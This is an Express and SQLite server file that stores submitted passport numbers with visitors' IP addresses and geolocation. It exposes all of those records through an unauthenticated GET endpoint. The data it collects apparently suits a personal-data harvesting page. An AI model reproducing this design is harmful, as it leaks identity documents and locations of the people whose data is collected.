const express = require('express');
const sqlite3 = require('sqlite3');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static('public'));

// Database setup
const db = new sqlite3.Database('data.db', (err) => {
    if (err) console.error(err);
    console.log('Connected to database');
});

db.run(`CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    passport TEXT,
    ip TEXT,
    city TEXT,
    region TEXT,
    country TEXT,
    latitude REAL,
    longitude REAL,
    timestamp TEXT
)`);

// Save data endpoint
app.post('/save', (req, res) => {
    const { passport, ip, location, timestamp } = req.body;
    
    db.run(`INSERT INTO submissions 
        (passport, ip, city, region, country, latitude, longitude, timestamp) 
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [
            passport,
            ip,
            location.city,
            location.region,
            location.country,
            location.latitude,
            location.longitude,
            timestamp
        ],
        (err) => {
            if (err) {
                console.error(err);
                res.status(500).send('Error saving data');
            } else {
                res.status(200).send('Data saved');
            }
        });
});

// Add this after your existing routes
app.get('/submissions', (req, res) => {
    db.all('SELECT * FROM submissions', [], (err, rows) => {
        if (err) {
            res.status(500).send('Error retrieving data');
        } else {
            res.json(rows);
        }
    });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});